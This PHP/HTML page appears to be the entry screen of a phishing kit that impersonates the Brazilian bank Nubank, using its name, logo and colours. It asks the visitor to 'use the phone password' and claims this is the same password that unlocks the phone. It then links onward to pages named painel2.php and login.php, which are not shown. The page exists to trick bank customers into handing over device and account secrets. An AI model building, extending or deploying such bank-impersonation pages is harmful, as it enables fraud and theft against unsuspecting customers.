<?php
session_start();

// Verifica se a sessão 'id' está definida, ou seja, se o usuário já está logado
if (isset($_SESSION['id'])) {
    // Redireciona para a página painel2.php
    header("Location: painel2.php");
    exit(); // Garante que o script será encerrado após o redirecionamento
}

// Se não estiver logado, a página 'entrar.php' continua sendo exibida normalmente
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nubank</title>
<title>Nubank</title>
<?php include('icones.php'); ?>    
  <style type="text/css">
    body {
	text-align: center;
	margin: 0;
	padding: 0;
	background-color: #FFF;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
.botaoentrar {
	background-color: #8A02DB;
	cursor: pointer;
	text-align: center;
	margin: 0px;
	padding: 0px;
	font-family: Tahoma, Geneva, sans-serif;
	width: 340px;
	font-size: 18px;
	background-position: center center;
	font-style: normal;
	height: 60px;
	border-radius: 50px;
	text-align: center;
	border: 1px none #FFF;
	color: #FFF;
}
  .fundoimagem tr td table tr td {
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
}
  .txt {
	font-family: Georgia, "Times New Roman", Times, serif;
	font-size: 14px;
}
  </style>
</head>
<body>
<table width="350" border="0" align="center">
  <tr>
    <td height="64" align="center"><table width="95%" border="0">
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td><img src="imagens/Nubank_logo_2021.png" width="60" height="33"></td>
      </tr>
      <tr>
        <td height="50">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
  <tr align="left" class="texto1">
    <td height="27" align="center" valign="middle" class="texto1"><img src="imagens/entrada_texto.png" width="350" height="163"></td>
  </tr>
  <tr align="left" class="texto1">
    <td height="27" align="center" valign="middle" class="texto1">&nbsp;</td>
  </tr>
  <tr>
    <td height="96" align="center" valign="bottom"><table width="350" border="0" align="center">
      <tr>
        <td height="70" align="center">&nbsp;</td>
      </tr>
      <tr>
        <td width="350" height="59" align="center"><a href="painel2.php">
          <input name="button2" class="botaoentrar" id="button2" value="Usar senha do celular" readonly>
        </a></td>
      </tr>
    </table></td>
  </tr>
  <tr align="left">
    <td height="57" align="center" valign="bottom"><table width="90%" border="0">
      <tr>
        <td><span class="texto1">Essa senha é a mesma forma de validação que voc&ecirc; usa para desbloquear seu celular.</span></td>
      </tr>
    </table></td>
  </tr>
  <tr align="left">
    <td height="39" align="center">&nbsp;</td>
  </tr>
</table>
<table width="100%" border="0" class="fundoimagem">
  <tr>
    <td height="98" align="center" valign="middle" bgcolor="#F0F2F5"><table width="350" border="0">
      <tr>
        <td width="71%" align="right">Pular esta explicação da próxima vez que
eu abrir o aplicativo do Nubank.<br></td>
        <td width="29%"><a href="login.php"><img src="imagens/botao.png" alt="clique aqui para entrar" width="78" height="53"></a></td>
      </tr>
  </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    <td height="21">&nbsp;</td>
  </tr>
</table>
</body>
</html>
